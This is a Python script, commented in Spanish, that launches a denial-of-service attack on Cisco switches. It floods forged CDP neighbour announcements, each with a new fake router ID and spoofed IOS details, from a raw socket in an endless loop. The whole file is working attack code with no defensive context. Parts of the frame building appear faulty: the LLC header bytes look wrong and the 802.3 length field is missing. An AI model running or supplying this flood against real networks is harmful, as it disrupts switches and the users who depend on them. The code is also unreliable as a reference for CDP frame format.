#!/usr/bin/env python3
import socket
import sys
import time
import random

interface = "eth0"
print(f"[*] Lanzando ataque CDP DoS de alta compatibilidad en {interface}...")
print("[*] Presiona Ctrl+C para detener el ataque.\n")

# 1. Obtener la dirección MAC real de la interfaz eth0
try:
    with open(f"/sys/class/net/{interface}/address", "r") as f:
        real_mac_str = f.read().strip()
    real_mac = bytes.fromhex(real_mac_str.replace(":", ""))
    print(f"[+] MAC Real detectada: {real_mac_str}")
except Exception as e:
    print(f"[-] Error al obtener la MAC de la interfaz {interface}: {e}")
    sys.exit(1)

# 2. Configurar el Socket Crudo (Raw Socket) a nivel de Kernel
try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((interface, 0))
except PermissionError:
    print("[-] Error: Debes ejecutar este script con 'sudo'.")
    sys.exit(1)
except Exception as e:
    print(f"[-] Error al abrir el socket: {e}")
    sys.exit(1)

# Dirección MAC Multicast destino oficial de CDP
cdp_multicast = b"\x01\x00\x0c\xcc\xcc\xcc"

# Cabeceras estáticas requeridas por Cisco (LLC + SNAP)
llc_snap = b"\x42\x42\x03\x00\x00\x0c\x20\x00"

# Función matemática para calcular el Checksum estándar de Internet (RFC 1071)
def calculate_checksum(data):
    if len(data) % 2 == 1:
        data += b"\x00"
    s = sum(int.from_bytes(data[i:i+2], "big") for i in range(0, len(data), 2))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

counter = 0
try:
    while True:
        counter += 1
        
        # Datos del falso vecino (Cambiamos el ID en cada ronda para saturar el Switch)
        device_id = f"Falso_Router_{counter}".encode('utf-8')
        platform = b"cisco 3725"
        software = b"Cisco IOS Software, Version 15.1"
        
        # Construcción de los bloques TLV (Type-Length-Value)
        # Device ID (Type 0x0001)
        tlv_device = b"\x00\x01" + int.to_bytes(len(device_id) + 4, 2, "big") + device_id
        # Software Version (Type 0x0002)
        tlv_software = b"\x00\x02" + int.to_bytes(len(software) + 4, 2, "big") + software
        # Platform (Type 0x0006)
        tlv_platform = b"\x00\x06" + int.to_bytes(len(platform) + 4, 2, "big") + platform
        
        all_tlvs = tlv_device + tlv_software + tlv_platform
        
        # Cabecera base de CDP: Versión 2, TTL 180s, Checksum temporal en 0x0000
        cdp_base = b"\x02\xb4\x00\x00"
        
        # Calcular el Checksum real sobre el contenido de CDP
        chk = calculate_checksum(cdp_base + all_tlvs)
        cdp_base_with_chk = b"\x02\xb4" + int.to_bytes(chk, 2, "big")
        
        # Ensamblar el paquete completo desde Capa 2
        # Ethernet (MAC Destino + MAC Origen) + LLC/SNAP + CDP
        packet = cdp_multicast + real_mac + llc_snap + cdp_base_with_chk + all_tlvs
        
        # Forzar relleno mínimo de trama Ethernet (60 bytes sin contar el CRC)
        if len(packet) < 60:
            packet += b"\x00" * (60 - len(packet))
            
        # Enviar el paquete directamente al cable físico
        s.send(packet)
        
        # Un pequeño respiro de 0.001s para no colapsar la CPU de tu propia máquina virtual
        time.sleep(0.001)

except KeyboardInterrupt:
    print("\n[!] Ataque detenido por el usuario.")
    s.close()
    sys.exit(0)
